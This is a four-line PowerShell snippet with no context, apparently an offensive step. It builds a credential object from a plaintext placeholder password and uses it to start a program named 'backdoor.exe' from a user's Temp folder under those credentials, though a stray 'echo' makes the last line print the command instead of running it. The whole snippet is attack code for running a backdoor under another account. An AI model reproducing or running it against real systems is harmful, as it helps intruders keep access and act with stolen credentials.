$username = '<username>'
$securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential 
